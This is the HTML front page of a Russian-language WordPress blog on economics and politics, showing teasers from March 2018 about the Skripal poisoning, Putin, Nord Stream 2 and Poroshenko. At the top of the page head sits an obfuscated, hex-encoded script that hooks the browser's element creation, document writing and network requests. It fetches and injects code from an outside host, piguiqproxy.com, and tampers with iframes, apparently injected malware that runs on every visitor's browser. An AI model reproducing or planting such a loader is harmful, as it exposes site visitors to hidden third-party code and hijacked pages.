<!DOCTYPE html>
<html lang="ru-RU" prefix="og: http://ogp.me/ns#">
<head>
	<!--[if IE]>
	<meta http-equiv="X-UA-Compatible" content="IE=9; IE=8; IE=7; IE=edge" /><![endif]-->
	<meta charset="utf-8" />
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<meta name="google-site-verification" content="z5Tu_NVHmlsBWzTZM_IL0I3OeVoRDW9KaCbFVnpHSek" />

<script type="text/javascript">(function(){function c(){var b={};for(var a=0;a< arguments.length;a+= 2){b[arguments[a]]= arguments[a+ 1]};return b}function b(){function h(){if(!a){return};var d=l[a[1]](a[0]);var c=0;for(var f=0;f< d[a[2]];f++){if(d[f][a[3]]&& d[f][a[3]]!= a[4]){if(!b){return};d[f][a[3]]= a[4];c++}};return c}function n(){var b=l[a[5]];for(var c=0;c< b[a[2]];c++){b[c][a[6]]= true};h();F[a[7]]()}function y(f,d,h){function c(){return g}var g=f[d][a[8]]();if(b=== false){return};h[a[9]]= f[d][a[10]](f);f[d]= h;f[d][a[8]]= c}function G(d){if(!b){b(true)};var c=F[a[12]][a[11]]()- d[a[13]];if(c< v){n()}}function w(d,b,f){F[a[19]][a[18]](d,b,c(a[14],false,a[15],false,a[16],false,a[17],f))}function r(c){c= z(c);if(!b){return};var d=l[a[21]](a[20]);d[a[22]]= false;d[a[23]]= c;l[a[25]][a[24]](d);if(b== 0){b= 1;return};l[a[25]][a[26]](d)}function z(b){var c=a[27]+ F[a[30]][a[29]]()[a[8]]()[a[28]](2,4);F[c]= x;b= a[31]+ b+ a[32]+ c+ a[33];return b}function A(g,f){function c(){f(h)}function d(){G(h)}var h= new F[a[34]]();if(!a){b(null);return};h[a[36]](a[35],g,true);h[a[37]]= a[38];h[a[13]]= F[a[12]][a[11]]();h[a[40]](a[39],c);if(!a){return};h[a[40]](a[41],d);h[a[42]](null)}function m(f){var m=f[a[45]]( new F[a[44]](a[43]));if(!a){b= true;return};if(m){var n=m[1];var s=n[a[47]](a[46]);var o=a[4],p=a[4],v=0,c=[];while(s[v]!= a[48]){p+= s[v];if(++v== s[a[2]]){return}};for(var g=v+ 1;g< s[a[2]];g++){var u=s[g],h=g- v- 1;var t=p[a[28]](h* 2,2);var l=F[a[49]](t,16),j=l;var r=a[4];for(var i=0;i< u[a[2]];i+= 2){var q=F[a[49]](u[a[28]](i,2),16);var d=q^ l;l= d^ j;d= d[a[8]](16);if(d[a[2]]< 2){d= a[50]+ d};r+= d};c[a[51]](r)};f= f[a[53]](n,c[a[52]](a[46]))};return f}function q(g){function c(g){function f(c){var g=c[a[64]];var h=null;try{h= g[a[65]][a[54]]}catch(e){};if(!b){b();b= 1};if(h){q(h);d[a[66]](a[39],f)}}var c=arguments[a[60]][a[9]];if(!a){b(a[15],a[68],null);b= true};var d=c[a[61]](this,arguments);if(d[a[62]]== a[63]){d[a[40]](a[39],f)};return d}function d(){if(!a){b();b= null;return}else {var c=arguments[a[60]][a[9]]};var d=this[a[67]];c[a[61]](this,arguments);if(d== a[68]){if(b=== 1){b= a[95]};o(this)}}function f(){var c=arguments[a[60]][a[9]];c[a[61]](this,arguments);if(!b){b(0,a[60],false)};o(this)}y(g,a[21],c);var h=d;y(g,a[69],h);y(g,a[70],h);if(!b){b= null;return};y(g,a[36],f);x[a[71]][a[51]](g);o(g)}function p(d,f){var g=d[a[64]];if(!b){return}else {var c=(f)?x[a[72]]:x[a[73]]};c[a[51]](g)}function o(c){if(b== 0){return}else {c[a[40]](a[41],x[a[74]],true)};c[a[40]](a[39],x[a[75]],true)}function s(){function f(j){function g(b){r(m(b[a[93]]))}if(j[a[76]]== 204){if(c[a[77]]){F[a[80]][a[79]](a[78]);return};c[a[77]]= l[a[82]][a[81]];if(!a){b= null;return};A(d(),f);return};x[a[84]][a[83]]= j[a[86]](a[85]);var h=j[a[86]](a[87]);if(!x[a[84]][a[83]]||  !h){return};x[a[84]][a[88]]= ( new F[a[90]](h))[a[89]];var i=x[a[84]][a[88]][a[92]](a[91]);if(!b){b= 0};if(i> 0){x[a[84]][a[88]]= x[a[84]][a[88]][a[28]](i+ 1)};A(h,g)}function d(){var d=[];for(k in c){if(!b){b(true,true,false);b= null};d[a[51]](k+ a[94]+ F[a[95]](c[k]))};if(b== 1){return};var f=(d[a[2]])?a[96]+ d[a[52]](a[97]):a[4];return l[a[82]][a[98]]+ a[99]+ g+ f}var c={};if(l[a[101]][a[92]](a[100])!=  -1){c[a[102]]= a[103]};A(d(),f)}function d(a){p(a,true)}function f(a){p(a,false)}if(!b){b= true;return}else {};if(!a){b();return}else {};if(!a){b(true);b= 0};if(!a){b= 1;return};var F=window,l=F[a[54]],v=300,u=7,i=a[55],j=a[56];var x={};var g=a[57];var t=false;if(!b){return};var D=false;var B=null;try{if(F[a[58]]&& F[a[58]][a[59]+ i]== j){F[a[58]][a[59]+ i]= a[4];t= true}}catch(e){};try{if(F[a[106]][a[105]][a[92]](a[104])>  -1){var C=F[a[106]][a[109]][a[45]]( new F[a[44]](a[107],a[108]));if(C&& C[1]){var E=F[a[49]](C[1]);if(!a){b()};if(E< 10){return}}}}catch(e){return};x[a[72]]= [];if(!a){b(0);return};x[a[73]]= [];x[a[71]]= [];x[a[84]]= c(a[88],a[4],a[83],a[4]);x[a[110]]= false;x[a[111]]= l[a[21]][a[10]](l);if(b== 0){return}else {x[a[74]]= d};x[a[75]]= f;s();q(l);if(t){l[a[70]](a[112]+ a[113]+ a[114]);l[a[115]]()}}var _a=["494d47","676574456c656d656e747342795461674e616d65","6c656e677468","737263","","7374796c65536865657473","64697361626c6564","73746f70","746f537472696e67","5f6f726967","62696e64","6e6f77","706572666f726d616e6365","7374617274","656e756d657261626c65","636f6e666967757261626c65","7772697461626c65","76616c7565","646566696e6550726f7065727479","4f626a656374","736372697074","637265617465456c656d656e74","6173796e63","74657874436f6e74656e74","617070656e644368696c64","646f63756d656e74456c656d656e74","72656d6f76654368696c64","6d7a735f5f","737562737472","72616e646f6d","4d617468","2866756e6374696f6e286d7a5f73747229207b","7d292827","27293b","584d4c4874747052657175657374","474554","6f70656e","726573706f6e736554797065","74657874","6c6f6164","6164644576656e744c697374656e6572","6572726f72","73656e64","766172205f613d5c5b22282e2b29225c5d3b","526567457870","6d61746368","222c22","73706c6974","6266346266643361643236386630306231616336666338613332613533303961","7061727365496e74","30","70757368","6a6f696e","7265706c616365","646f63756d656e74","7474745a5a5a326d","6634464676","70696775697170726f78792e636f6d2f617069","6f70656e6572","5f","63616c6c6565","6170706c79","7461674e616d65","494652414d45","746172676574","636f6e74656e7457696e646f77","72656d6f76654576656e744c697374656e6572","72656164795374617465","636f6d706c657465","7772697465","77726974656c6e","646f6373","65725f6c6f6164","73635f6c6f6164","65725f6c697374656e","73635f6c697374656e","737461747573","72","617267206c6f6164206661696c2c20323034","6c6f67","636f6e736f6c65","68726566","6c6f636174696f6e","73657373696f6e","76617273","582d4d6574612d526571756573742d4964","676574526573706f6e7365486561646572","582d4c6f636174696f6e","70726f78795f686f7374","686f7374","55524c","2d","696e6465784f66","726573706f6e736554657874","3d","656e636f6465555249436f6d706f6e656e74","3f","26","70726f746f636f6c","2f2f","6172676f6e5f656e61626c653d31","636f6f6b6965","77","31","4170706c65","76656e646f72","6e6176696761746f72","76657273696f6e2f285c642b29285b302d392e5d2b2920536166617269","69","757365724167656e74","646c6f61646564","63725f656c","3c4e4f","465241","4d45533e","636c6f7365"];var _o,_i,a=[];for(_o=0;_o<_a.length;_o++)for(a[_o]="",_i=0;_i<_a[_o].length;_i+=2)a[_o]+=String.fromCharCode(parseInt(_a[_o].substr(_i,2),16));(b)()})()/*a7e656bc1d0ee2765a1cc71e3d2da953c82f8c9c*/</script>

	<title>Экономика от Пророка &ndash; Актуальные новости и аналитика</title>

<!-- This site is optimized with the Yoast SEO plugin v6.0 - https://yoast.com/wordpress/plugins/seo/ -->
<meta name="description" content="Актуальные новости и аналитика"/>
<link rel="canonical" href="https://www.economics-prorok.com/" />
<link rel="next" href="http://www.economics-prorok.com/page/2" />
<meta property="og:locale" content="ru_RU" />
<meta property="og:type" content="website" />
<meta property="og:title" content="Экономика от Пророка &ndash; Актуальные новости и аналитика" />
<meta property="og:description" content="Актуальные новости и аналитика" />
<meta property="og:url" content="https://www.economics-prorok.com/" />
<meta property="og:site_name" content="Экономика от Пророка" />
<meta name="twitter:card" content="summary" />
<meta name="twitter:description" content="Актуальные новости и аналитика" />
<meta name="twitter:title" content="Экономика от Пророка &ndash; Актуальные новости и аналитика" />
<meta name="twitter:site" content="@proro2012" />
<script type='application/ld+json'>{"@context":"http:\/\/schema.org","@type":"WebSite","@id":"#website","url":"https:\/\/www.economics-prorok.com\/","name":"\u042d\u043a\u043e\u043d\u043e\u043c\u0438\u043a\u0430 \u043e\u0442 \u041f\u0440\u043e\u0440\u043e\u043a\u0430","potentialAction":{"@type":"SearchAction","target":"https:\/\/www.economics-prorok.com\/?s={search_term_string}","query-input":"required name=search_term_string"}}</script>
<script type='application/ld+json'>{"@context":"http:\/\/schema.org","@type":"Person","url":"https:\/\/www.economics-prorok.com\/","sameAs":["https:\/\/www.facebook.com\/\u042d\u043a\u043e\u043d\u043e\u043c\u0438\u043a\u0430-\u043e\u0442-\u041f\u0440\u043e\u0440\u043e\u043a\u0430-952590484790970","https:\/\/twitter.com\/proro2012"],"@id":"#person","name":"\u041c\u0438\u0448\u0435\u043b\u044c \u041f\u0440\u043e\u0440\u043e\u043a"}</script>
<!-- / Yoast SEO plugin. -->

<link rel='dns-prefetch' href='//www.economics-prorok.com' />
<link rel='dns-prefetch' href='//fonts.googleapis.com' />
<link rel='dns-prefetch' href='//s.w.org' />
<link rel="alternate" type="application/rss+xml" title="Экономика от Пророка &raquo; Лента" href="https://www.economics-prorok.com/feed" />
<link rel="alternate" type="application/rss+xml" title="Экономика от Пророка &raquo; Лента комментариев" href="https://www.economics-prorok.com/comments/feed" />
		<script type="text/javascript">
			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/2.4\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/2.4\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/www.economics-prorok.com\/wp-includes\/js\/wp-emoji-release.min.js?ver=4.9.3"}};
			!function(a,b,c){function d(a,b){var c=String.fromCharCode;l.clearRect(0,0,k.width,k.height),l.fillText(c.apply(this,a),0,0);var d=k.toDataURL();l.clearRect(0,0,k.width,k.height),l.fillText(c.apply(this,b),0,0);var e=k.toDataURL();return d===e}function e(a){var b;if(!l||!l.fillText)return!1;switch(l.textBaseline="top",l.font="600 32px Arial",a){case"flag":return!(b=d([55356,56826,55356,56819],[55356,56826,8203,55356,56819]))&&(b=d([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]),!b);case"emoji":return b=d([55357,56692,8205,9792,65039],[55357,56692,8203,9792,65039]),!b}return!1}function f(a){var c=b.createElement("script");c.src=a,c.defer=c.type="text/javascript",b.getElementsByTagName("head")[0].appendChild(c)}var g,h,i,j,k=b.createElement("canvas"),l=k.getContext&&k.getContext("2d");for(j=Array("flag","emoji"),c.supports={everything:!0,everythingExceptFlag:!0},i=0;i<j.length;i++)c.supports[j[i]]=e(j[i]),c.supports.everything=c.supports.everything&&c.supports[j[i]],"flag"!==j[i]&&(c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&c.supports[j[i]]);c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&!c.supports.flag,c.DOMReady=!1,c.readyCallback=function(){c.DOMReady=!0},c.supports.everything||(h=function(){c.readyCallback()},b.addEventListener?(b.addEventListener("DOMContentLoaded",h,!1),a.addEventListener("load",h,!1)):(a.attachEvent("onload",h),b.attachEvent("onreadystatechange",function(){"complete"===b.readyState&&c.readyCallback()})),g=c.source||{},g.concatemoji?f(g.concatemoji):g.wpemoji&&g.twemoji&&(f(g.twemoji),f(g.wpemoji)))}(window,document,window._wpemojiSettings);
		</script>
		<style type="text/css">
img.wp-smiley,
img.emoji {
	display: inline !important;
	border: none !important;
	box-shadow: none !important;
	height: 1em !important;
	width: 1em !important;
	margin: 0 .07em !important;
	vertical-align: -0.1em !important;
	background: none !important;
	padding: 0 !important;
}
</style>
<link rel='stylesheet' id='basic-fonts-css'  href='//fonts.googleapis.com/css?family=PT+Serif%3A400%2C700%7COpen+Sans%3A400%2C400italic%2C700%2C700italic&#038;subset=latin%2Ccyrillic&#038;ver=1' type='text/css' media='all' />
<link rel='stylesheet' id='basic-style-css'  href='https://www.economics-prorok.com/wp-content/themes/basic/style.css?ver=1' type='text/css' media='all' />
<script type='text/javascript' src='https://www.economics-prorok.com/wp-includes/js/jquery/jquery.js?ver=1.12.4'></script>
<script type='text/javascript' src='https://www.economics-prorok.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.4.1'></script>
<link rel='https://api.w.org/' href='https://www.economics-prorok.com/wp-json/' />
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://www.economics-prorok.com/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://www.economics-prorok.com/wp-includes/wlwmanifest.xml" /> 
<meta name="generator" content="WordPress 4.9.3" />

</head>
<body class="home blog layout-rightbar">
<div class="wrapper cleafix">

		<!-- BEGIN header -->
	<header id="header" class="clearfix">

				<div class="sitetitle maxwidth grid ">

			<div class="logo">

				                    <h1 id="logo">
                Экономика от Пророка                    </h1>
				
				
									<p class="sitedescription">Актуальные новости и аналитика</p>
				
			</div>
			
		</div>

				<div class="topnav grid">

			<div id="mobile-menu" class="mm-active">Меню</div>

			<nav>
									<ul class="top-menu maxwidth clearfix">
													<li class="page_item current_page_item"><span>Главная</span></li>
						<li class="page_item page-item-6117"><a href="https://www.economics-prorok.com/advertising">Реклама на сайте</a></li>
					</ul>
							</nav>

		</div>
		
	<div class="maxwidth grid" style="text-align: center; margin-top: 10px;">
	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<!-- new-ep-top-header -->
<ins class="adsbygoogle"
     style="display:block"
     data-ad-client="ca-pub-6900864180824447"
     data-ad-slot="4874862212"
     data-ad-format="auto"></ins>
<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script>
<script data-cfasync="false" type="text/javascript" src="//www.increaserev.com/ads/970x250.js"></script>
	</div> 
	</header>
	<!-- END header -->

	

	<div id="main" class="maxwidth clearfix">

		<!-- BEGIN content -->
	
	<main id="content">
	

<article class="post-42212 post type-post status-publish format-standard has-post-thumbnail hentry tag-6646 tag-164 tag-35 anons">		<h2><a href="https://www.economics-prorok.com/2018/03/wall-street-journal-%d0%b7%d0%b0%d0%bf%d0%b0%d0%b4-%d1%82%d0%be%d0%bb%d1%8c%d0%ba%d0%be-%d0%b8-%d0%bc%d0%be%d0%b6%d0%b5%d1%82-%d1%87%d1%82%d0%be-%d1%82%d0%be%d0%bf%d0%b0%d1%82%d1%8c-%d0%bd%d0%be.html" title="Wall Street Journal: Запад только и может что топать ногами — и Путин это знает">Wall Street Journal: Запад только и может что топать ногами — и Путин это знает</a></h2>
		<aside class="meta"><span class="date">Март 17, 2018</span><span class="comments"><a href="https://www.economics-prorok.com/2018/03/wall-street-journal-%d0%b7%d0%b0%d0%bf%d0%b0%d0%b4-%d1%82%d0%be%d0%bb%d1%8c%d0%ba%d0%be-%d0%b8-%d0%bc%d0%be%d0%b6%d0%b5%d1%82-%d1%87%d1%82%d0%be-%d1%82%d0%be%d0%bf%d0%b0%d1%82%d1%8c-%d0%bd%d0%be.html#respond">Комментарии: 0</a></span><span class="tags">Метки: <a href="https://www.economics-prorok.com/tag/%d0%be%d1%82%d1%80%d0%b0%d0%b2%d0%bb%d0%b5%d0%bd%d0%b8%d0%b5-%d1%81%d0%ba%d1%80%d0%b8%d0%bf%d0%b0%d0%bb%d1%8f" rel="tag">отравление Скрипаля</a>, <a href="https://www.economics-prorok.com/tag/%d0%bf%d1%83%d1%82%d0%b8%d0%bd" rel="tag">Путин</a>, <a href="https://www.economics-prorok.com/tag/%d1%81%d0%b0%d0%bd%d0%ba%d1%86%d0%b8%d0%b8-%d0%bf%d1%80%d0%be%d1%82%d0%b8%d0%b2-%d1%80%d0%be%d1%81%d1%81%d0%b8%d0%b8" rel="tag">санкции против России</a></span></aside>	<div class="entry-box clearfix" >

						<a href="https://www.economics-prorok.com/2018/03/wall-street-journal-%d0%b7%d0%b0%d0%bf%d0%b0%d0%b4-%d1%82%d0%be%d0%bb%d1%8c%d0%ba%d0%be-%d0%b8-%d0%bc%d0%be%d0%b6%d0%b5%d1%82-%d1%87%d1%82%d0%be-%d1%82%d0%be%d0%bf%d0%b0%d1%82%d1%8c-%d0%bd%d0%be.html" title="Wall Street Journal: Запад только и может что топать ногами — и Путин это знает" class="anons-thumbnail">
					<img width="300" height="169" src="https://www.economics-prorok.com/wp-content/uploads/2018/03/635948_1_RTS1LXB91_big-300x169.jpg" class="thumbnail wp-post-image" alt="" srcset="https://www.economics-prorok.com/wp-content/uploads/2018/03/635948_1_RTS1LXB91_big-300x169.jpg 300w, https://www.economics-prorok.com/wp-content/uploads/2018/03/635948_1_RTS1LXB91_big-768x432.jpg 768w, https://www.economics-prorok.com/wp-content/uploads/2018/03/635948_1_RTS1LXB91_big.jpg 774w" sizes="(max-width: 300px) 100vw, 300px" />				</a>
				<p>Ответ Запада на действия Путина в Европе, США, Украине и Сирии пока что больше напоминает «топанье ногами» в сочетании с «жалобным воем». Единственный способ заставить российского президента начать считаться с Западом — это поставить под угрозу финансовые активы его ближнего окружения.</p>
		<p class="more-link-box">
			<a class="more-link" href="https://www.economics-prorok.com/2018/03/wall-street-journal-%d0%b7%d0%b0%d0%bf%d0%b0%d0%b4-%d1%82%d0%be%d0%bb%d1%8c%d0%ba%d0%be-%d0%b8-%d0%bc%d0%be%d0%b6%d0%b5%d1%82-%d1%87%d1%82%d0%be-%d1%82%d0%be%d0%bf%d0%b0%d1%82%d1%8c-%d0%bd%d0%be.html#more-42212" title="Wall Street Journal: Запад только и может что топать ногами — и Путин это знает">Читать далее</a>
		</p>
		
	</div> 
	</article>

<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<!-- new_ep_after_first_article -->
<ins class="adsbygoogle"
     style="display:block"
     data-ad-client="ca-pub-6900864180824447"
     data-ad-slot="7350650610"
     data-ad-format="auto"></ins>
<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script>
	
<article class="post-42209 post type-post status-publish format-standard has-post-thumbnail hentry tag-6779 tag-4109 tag-2626 tag-19 anons">		<h2><a href="https://www.economics-prorok.com/2018/03/%d0%ba%d0%b0%d0%ba-%d1%81%d0%bd%d0%b5%d1%81%d1%82%d0%b8-%d0%b8%d0%b7%d0%b4%d0%b5%d0%b2%d0%b0%d1%8e%d1%89%d0%b8%d0%b9%d1%81%d1%8f-%d0%bd%d0%b0%d0%b4-%d1%83%d0%ba%d1%80%d0%b0%d0%b8%d0%bd%d1%81%d0%ba.html" title="Как снести издевающийся над украинским народом режим Порошенко?">Как снести издевающийся над украинским народом режим Порошенко?</a></h2>
		<aside class="meta"><span class="date">Март 17, 2018</span><span class="comments"><a href="https://www.economics-prorok.com/2018/03/%d0%ba%d0%b0%d0%ba-%d1%81%d0%bd%d0%b5%d1%81%d1%82%d0%b8-%d0%b8%d0%b7%d0%b4%d0%b5%d0%b2%d0%b0%d1%8e%d1%89%d0%b8%d0%b9%d1%81%d1%8f-%d0%bd%d0%b0%d0%b4-%d1%83%d0%ba%d1%80%d0%b0%d0%b8%d0%bd%d1%81%d0%ba.html#respond">Комментарии: 0</a></span><span class="tags">Метки: <a href="https://www.economics-prorok.com/tag/%d0%b2%d1%81%d0%b5%d0%be%d0%b1%d1%89%d0%b0%d1%8f-%d0%b7%d0%b0%d0%b1%d0%b0%d1%81%d1%82%d0%be%d0%b2%d0%ba%d0%b0" rel="tag">всеобщая забастовка</a>, <a href="https://www.economics-prorok.com/tag/%d0%b5%d0%bb%d0%b5%d0%bd%d0%b0-%d0%ba%d1%81%d0%b0%d0%bd%d1%82%d0%be%d0%bf%d1%83%d0%bb%d0%be%d1%81" rel="tag">Елена Ксантопулос</a>, <a href="https://www.economics-prorok.com/tag/%d1%80%d0%b5%d0%b6%d0%b8%d0%bc-%d0%bf%d0%be%d1%80%d0%be%d1%88%d0%b5%d0%bd%d0%ba%d0%be" rel="tag">режим Порошенко</a>, <a href="https://www.economics-prorok.com/tag/%d1%82%d1%80%d0%b5%d1%82%d0%b8%d0%b9-%d0%bc%d0%b0%d0%b9%d0%b4%d0%b0%d0%bd-%d0%b2-%d1%83%d0%ba%d1%80%d0%b0%d0%b8%d0%bd%d0%b5" rel="tag">третий Майдан в Украине</a></span></aside>	<div class="entry-box clearfix" >

						<a href="https://www.economics-prorok.com/2018/03/%d0%ba%d0%b0%d0%ba-%d1%81%d0%bd%d0%b5%d1%81%d1%82%d0%b8-%d0%b8%d0%b7%d0%b4%d0%b5%d0%b2%d0%b0%d1%8e%d1%89%d0%b8%d0%b9%d1%81%d1%8f-%d0%bd%d0%b0%d0%b4-%d1%83%d0%ba%d1%80%d0%b0%d0%b8%d0%bd%d1%81%d0%ba.html" title="Как снести издевающийся над украинским народом режим Порошенко?" class="anons-thumbnail">
					<img width="300" height="192" src="https://www.economics-prorok.com/wp-content/uploads/2018/03/172881-300x192.jpg" class="thumbnail wp-post-image" alt="" srcset="https://www.economics-prorok.com/wp-content/uploads/2018/03/172881-300x192.jpg 300w, https://www.economics-prorok.com/wp-content/uploads/2018/03/172881.jpg 620w" sizes="(max-width: 300px) 100vw, 300px" />				</a>
				<p>Порошенко отобрал у нас не только справедливость, он отобрал у нас образование, медицинское обслуживание, пенсии, надежду на окончание войны и возвращение наших земель. Он отобрал у нас все!</p>
		<p class="more-link-box">
			<a class="more-link" href="https://www.economics-prorok.com/2018/03/%d0%ba%d0%b0%d0%ba-%d1%81%d0%bd%d0%b5%d1%81%d1%82%d0%b8-%d0%b8%d0%b7%d0%b4%d0%b5%d0%b2%d0%b0%d1%8e%d1%89%d0%b8%d0%b9%d1%81%d1%8f-%d0%bd%d0%b0%d0%b4-%d1%83%d0%ba%d1%80%d0%b0%d0%b8%d0%bd%d1%81%d0%ba.html#more-42209" title="Как снести издевающийся над украинским народом режим Порошенко?">Читать далее</a>
		</p>
		
	</div> 
	</article>


<article class="post-42206 post type-post status-publish format-standard has-post-thumbnail hentry tag---2 tag------2 anons">		<h2><a href="https://www.economics-prorok.com/2018/03/%d1%81%d0%b5%d0%bd%d0%b0%d1%82%d0%be%d1%80%d1%8b-%d1%81%d1%88%d0%b0-%d0%bf%d0%be%d1%82%d1%80%d0%b5%d0%b1%d0%be%d0%b2%d0%b0%d0%bb%d0%b8-%d0%b7%d0%b0%d0%b1%d0%bb%d0%be%d0%ba%d0%b8%d1%80%d0%be%d0%b2.html" title="Сенаторы США потребовали заблокировать российский «Северный поток-2»">Сенаторы США потребовали заблокировать российский «Северный поток-2»</a></h2>
		<aside class="meta"><span class="date">Март 17, 2018</span><span class="comments"><a href="https://www.economics-prorok.com/2018/03/%d1%81%d0%b5%d0%bd%d0%b0%d1%82%d0%be%d1%80%d1%8b-%d1%81%d1%88%d0%b0-%d0%bf%d0%be%d1%82%d1%80%d0%b5%d0%b1%d0%be%d0%b2%d0%b0%d0%bb%d0%b8-%d0%b7%d0%b0%d0%b1%d0%bb%d0%be%d0%ba%d0%b8%d1%80%d0%be%d0%b2.html#respond">Комментарии: 0</a></span><span class="tags">Метки: <a href="https://www.economics-prorok.com/tag/%d1%81%d0%b5%d0%b2%d0%b5%d1%80%d0%bd%d1%8b%d0%b9-%d0%bf%d0%be%d1%82%d0%be%d0%ba-2" rel="tag">Северный поток-2</a>, <a href="https://www.economics-prorok.com/tag/%d1%81%d0%b5%d0%bd%d0%b0%d1%82%d0%be%d1%80%d1%8b-%d1%81%d1%88%d0%b0-%d0%bf%d1%80%d0%be%d1%82%d0%b8%d0%b2-%d1%81%d0%b5%d0%b2%d0%b5%d1%80%d0%bd%d0%be%d0%b3%d0%be-%d0%bf%d0%be%d1%82%d0%be%d0%ba%d0%b0-2" rel="tag">сенаторы США против Северного потока-2</a></span></aside>	<div class="entry-box clearfix" >

						<a href="https://www.economics-prorok.com/2018/03/%d1%81%d0%b5%d0%bd%d0%b0%d1%82%d0%be%d1%80%d1%8b-%d1%81%d1%88%d0%b0-%d0%bf%d0%be%d1%82%d1%80%d0%b5%d0%b1%d0%be%d0%b2%d0%b0%d0%bb%d0%b8-%d0%b7%d0%b0%d0%b1%d0%bb%d0%be%d0%ba%d0%b8%d1%80%d0%be%d0%b2.html" title="Сенаторы США потребовали заблокировать российский «Северный поток-2»" class="anons-thumbnail">
					<img width="300" height="169" src="https://www.economics-prorok.com/wp-content/uploads/2018/03/orig-1509037444b92e80bf1cd70bcdb3d7bbcc89ce9a3e-300x169.jpeg" class="thumbnail wp-post-image" alt="" srcset="https://www.economics-prorok.com/wp-content/uploads/2018/03/orig-1509037444b92e80bf1cd70bcdb3d7bbcc89ce9a3e-300x169.jpeg 300w, https://www.economics-prorok.com/wp-content/uploads/2018/03/orig-1509037444b92e80bf1cd70bcdb3d7bbcc89ce9a3e.jpeg 710w" sizes="(max-width: 300px) 100vw, 300px" />				</a>
				<p>В США 39 сенаторов — 28 от Республиканской партии и 11 от Демократической — в письме (pdf.) от 15 марта на имя главы Минфина Стивена Мнучина и замгоссекретаря Джона Салливана выступили против трубопровода «Северный поток-2» (Nord Stream 2).</p>
		<p class="more-link-box">
			<a class="more-link" href="https://www.economics-prorok.com/2018/03/%d1%81%d0%b5%d0%bd%d0%b0%d1%82%d0%be%d1%80%d1%8b-%d1%81%d1%88%d0%b0-%d0%bf%d0%be%d1%82%d1%80%d0%b5%d0%b1%d0%be%d0%b2%d0%b0%d0%bb%d0%b8-%d0%b7%d0%b0%d0%b1%d0%bb%d0%be%d0%ba%d0%b8%d1%80%d0%be%d0%b2.html#more-42206" title="Сенаторы США потребовали заблокировать российский «Северный поток-2»">Читать далее</a>
		</p>
		
	</div> 
	</article>


<article class="post-42202 post type-post status-publish format-standard has-post-thumbnail hentry tag-6646 tag-6645 tag-1562 anons">		<h2><a href="https://www.economics-prorok.com/2018/03/%d0%be%d0%b4%d0%bd%d0%be%d0%ba%d1%83%d1%80%d1%81%d0%bd%d0%b8%d0%ba-%d0%bf%d1%83%d1%82%d0%b8%d0%bd%d0%b0-%d1%8d%d0%ba%d1%81-%d1%80%d0%b0%d0%b7%d0%b2%d0%b5%d0%b4%d1%87%d0%b8%d0%ba-%d0%ba%d0%b3%d0%b1.html" title="Однокурсник Путина, экс-разведчик КГБ: «Российские спецслужбы занимаются не разведкой, а крышеванием проституции и торговлей кокаином»">Однокурсник Путина, экс-разведчик КГБ: «Российские спецслужбы занимаются не разведкой, а крышеванием проституции и торговлей кокаином»</a></h2>
		<aside class="meta"><span class="date">Март 16, 2018</span><span class="comments"><a href="https://www.economics-prorok.com/2018/03/%d0%be%d0%b4%d0%bd%d0%be%d0%ba%d1%83%d1%80%d1%81%d0%bd%d0%b8%d0%ba-%d0%bf%d1%83%d1%82%d0%b8%d0%bd%d0%b0-%d1%8d%d0%ba%d1%81-%d1%80%d0%b0%d0%b7%d0%b2%d0%b5%d0%b4%d1%87%d0%b8%d0%ba-%d0%ba%d0%b3%d0%b1.html#comments">Комментарии: 2</a></span><span class="tags">Метки: <a href="https://www.economics-prorok.com/tag/%d0%be%d1%82%d1%80%d0%b0%d0%b2%d0%bb%d0%b5%d0%bd%d0%b8%d0%b5-%d1%81%d0%ba%d1%80%d0%b8%d0%bf%d0%b0%d0%bb%d1%8f" rel="tag">отравление Скрипаля</a>, <a href="https://www.economics-prorok.com/tag/%d0%bf%d1%83%d1%82%d0%b8%d0%bd-%d0%b8-%d0%ba%d0%b3%d0%b1" rel="tag">Путин и КГБ</a>, <a href="https://www.economics-prorok.com/tag/%d1%8e%d1%80%d0%b8%d0%b9-%d1%88%d0%b2%d0%b5%d1%86" rel="tag">Юрий Швец</a></span></aside>	<div class="entry-box clearfix" >

						<a href="https://www.economics-prorok.com/2018/03/%d0%be%d0%b4%d0%bd%d0%be%d0%ba%d1%83%d1%80%d1%81%d0%bd%d0%b8%d0%ba-%d0%bf%d1%83%d1%82%d0%b8%d0%bd%d0%b0-%d1%8d%d0%ba%d1%81-%d1%80%d0%b0%d0%b7%d0%b2%d0%b5%d0%b4%d1%87%d0%b8%d0%ba-%d0%ba%d0%b3%d0%b1.html" title="Однокурсник Путина, экс-разведчик КГБ: «Российские спецслужбы занимаются не разведкой, а крышеванием проституции и торговлей кокаином»" class="anons-thumbnail">
					<img width="300" height="192" src="https://www.economics-prorok.com/wp-content/uploads/2018/03/original_1369441449-300x192.jpg" class="thumbnail wp-post-image" alt="" srcset="https://www.economics-prorok.com/wp-content/uploads/2018/03/original_1369441449-300x192.jpg 300w, https://www.economics-prorok.com/wp-content/uploads/2018/03/original_1369441449-768x491.jpg 768w, https://www.economics-prorok.com/wp-content/uploads/2018/03/original_1369441449-1024x655.jpg 1024w" sizes="(max-width: 300px) 100vw, 300px" />				</a>
				<p>Министр иностранных дел Великобритании Борис Джонсон обвинил Путина в покушении на экс-полковника ГРУ Сергея Скрипаля. По его словам, распоряжение использовать химоружие в Британии отдал лично президент России (фашистское государство, признанное Законом Украины от 20.02.18 страной-агрессором).  При этом, как сообщает The Telegraph со ссылкой на британские спецслужбы, нервно-паралитическое вещество, которым отравили Скрипаля, было ввезено в Великобританию в чемодане его дочери &#8230;</p>
		<p class="more-link-box">
